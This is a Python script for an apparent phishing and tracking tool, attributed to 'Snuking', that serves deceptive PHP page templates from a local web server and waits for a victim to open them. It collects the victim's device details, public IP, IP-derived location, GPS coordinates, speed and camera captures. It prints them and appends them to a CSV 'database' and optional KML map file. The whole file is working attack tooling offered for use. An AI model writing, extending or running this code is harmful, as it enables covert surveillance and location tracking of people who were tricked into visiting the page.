#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import platform
from shutil import which

#- Colors -
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[31m'
WHITE = '\033[0m'

#- Alerts -
PRIMARY = '[' + RED + '>' + YELLOW + '>' + GREEN + '>' + WHITE + '] '
SUCCESS = '[' + GREEN + 'i' + WHITE + '] '
ALERT = '[' + YELLOW + 'i' + WHITE + '] '
WARNING = '[' + YELLOW + '!' + WHITE + '] '
ERROR = '[' + RED + '!' + WHITE + '] '

def clear():
	if platform.system() == "Windows":
		os.system("cls")
	elif platform.system() == "Linux":
		os.system("clear")
	else:
		os.system("clear")

clear()

print(ALERT + 'Checking Dependencies...')

dependencies = ['python3', 'pip3', 'php', 'ssh']

for package in dependencies:
	installed = which(package)
	if installed is None:
		print('\n' + ALERT + 'installing ' + package + '...')
		os.system("pkg install {} -y".format(package))
	else:
		pass

import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL (Optional)')
parser.add_argument('-k', '--kml', help='Provide KML Filename (Optional)')
parser.add_argument('-p', '--port', type=int, default=8080, help='Port for Web Server [Default : 8080]')

args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
port = args.port

row = []
php_info = ''
php_locate = ''
version = '1.0.0'

def banner():
	print(ALERT + 'Created By: Snuking')
	print(ALERT + 'Version: ' + version + '\n')

def version_check():
	print(ALERT + 'Checking for Updates.....')
	github_url = 'https://raw.githubusercontent.com/WesleyB18/demo-phishing/master/version.txt'
	try:
		github_requests = requests.get(github_url)
		status = github_requests.status_code
		if status == 200:
			github_version = github_requests.text
			github_version = github_version.strip()
			if version == github_version:
				print('[' + GREEN + 'Up-To-Date' + WHITE + ']' + '\n')
			else:
				print('[' + YELLOW + 'Available : {}'.format(github_version) + WHITE + ']' + '\n')
		else:
			print(ERROR + 'Status : {}'.format(status) + '\n')
	except Exception as e:
		print('\n' + ERROR + 'Exception: ' + str(e))

def template_select():
	global dir_name, php_info, php_locate, php_cam
	print(SUCCESS + 'Select a Template: ' + '\n')

	with open('template/templates.json', 'r') as templates:
		templates_read = templates.read()

	templates_json = json.loads(templates_read)

	for template in templates_json['templates']:
		template_name = template['name']
		template_index = templates_json['templates'].index(template)
		print('[' + GREEN + '{}'.format(template_index) + WHITE + '] ' + '{}'.format(template_name))

	template_selected = int(input('\n' + PRIMARY))

	try:
		dir_name = templates_json['templates'][template_selected]['dir_name']
	except IndexError:
		print('\n' + ERROR + 'Invalid Input!' + '\n')
		sys.exit()
	
	print('\n' + SUCCESS + 'Loading {} Template...'.format(templates_json['templates'][template_selected]['name']) + WHITE)

	module = templates_json['templates'][template_selected]['module']

	if module:
		import_file = templates_json['templates'][template_selected]['import_file']
		import importlib
		importlib.import_module('template.' + import_file)
	else:
		pass

	php_info = 'template/{}/php/info.txt'.format(dir_name)
	php_locate = 'template/{}/php/locate.txt'.format(dir_name)
	php_cam = 'template/{}/php/cam.txt'.format(dir_name)

def server():
	print('\n' + SUCCESS + 'Port: ' + str(port))
	print('\n' + SUCCESS + 'Starting PHP Server......')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(dir_name)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_requests = requests.get('http://0.0.0.0:{}/index.html'.format(port))
		status = php_requests.status_code
		if status == 200:
			print('[' + GREEN + 'Success' + WHITE + ']')
		else:
			print('[' + RED + 'Status : {}'.format(status) + WHITE + ']')
	except requests.ConnectionError:
		print('[' + RED + 'Failed' + WHITE + ']')
		Quit()

def wait():
	printed = False
	while True:
		time.sleep(2)
		locate_size = os.path.getsize(php_locate)
		cam_size = os.path.getsize(php_cam)
		if locate_size == 0 and printed == False:
			print('\n' + ALERT + YELLOW + 'Waiting for User Interaction...... ' + WHITE + 'Press Ctrl + C to exit' + '\n')
			printed = True
		if cam_size > 0:
			try:
				with open (php_cam, 'r') as cam_txt:
					cam_txt = cam_txt.read()
					print(SUCCESS + GREEN + cam_txt + WHITE)
				with open (php_cam, 'r+') as new_cam_txt:
					new_cam_txt.truncate(0)
			except ValueError:
				pass
		if locate_size > 0:
			main()

def main():
	global php_info, php_locate, row, var_lat, var_lon

	try:
		row = []
		with open (php_info, 'r') as info_txt:
			info_txt = info_txt.read()
			info_json = json.loads(info_txt)
			for value in info_json['dev']:
				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Not Available'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']

				row.append(var_os)
				row.append(var_platform) 
				row.append(var_cores) 
				row.append(var_ram) 
				row.append(var_vendor)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)

				print(ALERT + 'Device Information: ' + '\n')
				print(SUCCESS + 'OS         : ' + GREEN + var_os + WHITE)
				print(SUCCESS + 'Platform   : ' + GREEN + var_platform + WHITE)
				print(SUCCESS + 'CPU Cores  : ' + GREEN + var_cores + WHITE)
				print(SUCCESS + 'RAM        : ' + GREEN + var_ram + WHITE)
				print(SUCCESS + 'GPU Vendor : ' + GREEN + var_vendor + WHITE)
				print(SUCCESS + 'GPU        : ' + GREEN + var_render + WHITE)
				print(SUCCESS + 'Resolution : ' + GREEN + var_res + WHITE)
				print(SUCCESS + 'Browser    : ' + GREEN + var_browser + WHITE)
				print(SUCCESS + 'Public IP  : ' + GREEN + var_ip + WHITE)

				ip_requests = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				status = ip_requests.status_code

				if status == 200:
					data = ip_requests.text
					data = json.loads(data)
					var_continent = str(data['continent'])
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])

					row.append(var_continent)
					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_org)
					row.append(var_isp)

					print(SUCCESS + 'Continent  : ' + GREEN + var_continent + WHITE)
					print(SUCCESS + 'Country    : ' + GREEN + var_country + WHITE)
					print(SUCCESS + 'Region     : ' + GREEN + var_region + WHITE)
					print(SUCCESS + 'City       : ' + GREEN + var_city + WHITE)
					print(SUCCESS + 'Org        : ' + GREEN + var_org + WHITE)
					print(SUCCESS + 'ISP        : ' + GREEN + var_isp + WHITE)
		try:
			with open (php_info, 'r+') as new_info_txt:
				new_info_txt.truncate(0)
		except ValueError:
			pass
	except ValueError:
		pass
    
	try:
		with open (php_locate, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Not Available'
				else:
					var_alt == value['alt'] + ' m'
				
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Not Available'
				else:
					var_dir = value['dir'] + ' deg'
				
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Not Available'
				else:
					var_spd = value['spd'] + ' m/s'

				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)

				print ('\n' + ALERT + 'Location Information: ' + '\n')
				print (SUCCESS + 'Latitude  : ' + GREEN + var_lat + WHITE)
				print (SUCCESS + 'Longitude : ' + GREEN + var_lon + WHITE)
				print (SUCCESS + 'Accuracy  : ' + GREEN + var_acc + WHITE)
				print (SUCCESS + 'Altitude  : ' + GREEN + var_alt + WHITE)
				print (SUCCESS + 'Direction : ' + GREEN + var_dir + WHITE)
				print (SUCCESS + 'Speed     : ' + GREEN + var_spd + WHITE)
		try:
			with open (php_locate, 'r+') as new_info_txt:
				new_info_txt.truncate(0)
		except ValueError:
			pass
	except ValueError:
		error = file
		print ('\n' + ERROR + error)
		repeat()

	print ('\n' + SUCCESS + 'Google Maps.................: ' + YELLOW + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg') + WHITE)

	if kml_fname is not None:
		kmlout(var_lat, var_lon)
    
	csvout()
	repeat()

def kmlout(var_lat, var_lon):
	with open('template/sample.kml', 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(SUCCESS + 'KML File Generated..........: ' + YELLOW + os.getcwd() + '/{}.kml'.format(kml_fname) + WHITE)

def csvout():
	global row
	with open('db/results.csv', 'a') as csvfile:
		writer = csv.writer(csvfile)
		writer.writerow(row)
	print(SUCCESS + 'New Entry Added in Database.: ' + YELLOW + os.getcwd() + '/db/results.csv' + WHITE)

def clear():
	global php_locate
	with open (php_locate, 'w+'): pass
	with open (php_info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global php_locate
	with open (php_locate, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	banner()
	version_check()
	template_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
	print ('\n' + ERROR + 'Keyboard Interrupt.')
	Quit()
